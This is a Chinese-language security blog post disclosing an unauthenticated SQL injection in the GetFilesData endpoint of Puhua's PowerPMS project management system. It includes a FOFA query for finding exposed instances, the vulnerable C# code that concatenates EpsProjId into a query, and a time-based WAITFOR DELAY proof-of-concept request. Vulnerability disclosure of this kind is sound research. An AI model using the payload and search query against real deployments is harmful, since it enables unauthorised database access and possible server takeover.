---
title: "普华Powerpms GetFilesData SQL注入漏洞"
source: https://mrxn.net/jswz/powerpms-UploadFle-GetFilesData-sqli.html
asset_dir: assets/普华powerpms-getfilesdata-sql注入漏洞
---

# 普华Powerpms GetFilesData SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/22 12:27
- 1363浏览
- [0评论](#comment)
- 12分钟阅读

深入探索

安全

服务器

数据库

---

# 漏洞简介

普华PowerPMS是上海普华科技发展股份有限公司旗下一款项目管理信息平台。其PowerPMS系统GetFilesData接口存在[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

# 影响版本

# fofa语法

> app="普华科技-PowerPMS" || body="Power.login.init" && body="Power.ui.warning" && body="Power\_login\_btn"

# 漏洞分析

系统采用MVC文件架构，直接在`controller`里搜文件操作相关的方法找到`UploadFle`，在其中找到`GetFilesData`的实现

```
[Power.Controls.PMS.Action(Authorize = false)]
public string GetFilesData(string EpsProjId, string StartDate, string EndDate)
{
  Power.Global.ViewResultModel viewResultModel = Power.Global.ViewResultModel.Create(true, "");
  DataTable dataTable1 = DAL.QuerySQL("select name from syscolumns where id=object_id('PB_DocFiles')and name='UpdDate'");
  DataTable dataTable2 = DAL.QuerySQL($"select LongCode from dbo.PLN_project where project_guid ='{EpsProjId}'");
  if (dataTable2 != null && ((InternalDataCollectionBase) dataTable2.Rows).Count > 0)
```

Authorize = false 表明此接口不需要鉴权

深入探索

物流软件安全

代码安全审计

Nessus

[![普华Powerpms GetFilesData SQL注入漏洞](images/img-001-81ed14d76904.webp)](https://image.mrxn.net/a29dc94ae1994aef8801ad5d65e03a37.webp)

同时可以看到`EpsProjId`参数被直接拼接进SQL语句中执行，无过滤或校验，因此造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)，就是朴实无华。

# 漏洞复现

```
POST /UploadFle/GetFilesData HTTP/1.1
Host: powerpms.mrxn.net

EndDate=2025&EpsProjId=1'WAITFOR DELAY'0:0:5'--&StartDate=2025
```

[![普华Powerpms GetFilesData SQL注入漏洞](images/img-002-d8e74ea160f1.webp)](https://image.mrxn.net/218f07b4ccf04b6294396fbc2147dc40.webp)

成功延时5秒

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
